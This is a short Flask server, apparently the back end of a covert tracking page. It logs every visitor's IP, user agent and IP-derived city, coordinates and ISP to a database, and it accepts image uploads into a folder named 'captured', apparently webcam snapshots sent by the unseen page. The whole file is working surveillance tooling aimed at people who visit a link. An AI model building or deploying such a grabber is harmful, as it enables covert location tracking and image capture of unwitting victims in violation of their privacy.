from flask import Flask, request, render_template
from datetime import datetime
import os
import requests
import sqlite3

app = Flask(__name__)
UPLOAD_FOLDER = "captured"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Inisialisasi database
def init_db():
    conn = sqlite3.connect("visitors.db")
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            country TEXT,
            region TEXT,
            city TEXT,
            lat REAL,
            lon REAL,
            isp TEXT,
            user_agent TEXT
        )
    """)
    conn.commit()
    conn.close()

# Simpan metadata ke database
def save_to_db(metadata):
    conn = sqlite3.connect("visitors.db")
    c = conn.cursor()
    c.execute("""
        INSERT INTO visitors (timestamp, ip, country, region, city, lat, lon, isp, user_agent)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        metadata["timestamp"],
        metadata["ip"],
        metadata["country"],
        metadata["region"],
        metadata["city"],
        metadata["lat"],
        metadata["lon"],
        metadata["isp"],
        metadata["user_agent"]
    ))
    conn.commit()
    conn.close()

# Ambil lokasi dari IP
def get_geolocation(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        if response.status_code == 200:
            data = response.json()
            return {
                "ip": ip,
                "country": data.get("country", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "city": data.get("city", "Unknown"),
                "lat": data.get("lat", 0.0),
                "lon": data.get("lon", 0.0),
                "isp": data.get("isp", "Unknown")
            }
    except Exception as e:
        print(f"[!] Gagal ambil lokasi: {e}")
    return {
        "ip": ip, "country": "Unknown", "region": "Unknown",
        "city": "Unknown", "lat": 0.0, "lon": 0.0, "isp": "Unknown"
    }

@app.route("/")
def home():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.user_agent.string
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    location = get_geolocation(ip)

    metadata = {
        "timestamp": timestamp,
        "ip": ip,
        "country": location["country"],
        "region": location["region"],
        "city": location["city"],
        "lat": location["lat"],
        "lon": location["lon"],
        "isp": location["isp"],
        "user_agent": user_agent
    }

    save_to_db(metadata)

    print(f"{timestamp} | IP: {ip} | {location['city']}, {location['region']}, {location['country']} | ISP: {location['isp']}")

    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload():
    image = request.files.get("image")
    if image:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(UPLOAD_FOLDER, f"{timestamp}.jpg")
        image.save(filename)
        print(f"[+] Gambar disimpan di {filename}")
    return "", 204

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000)
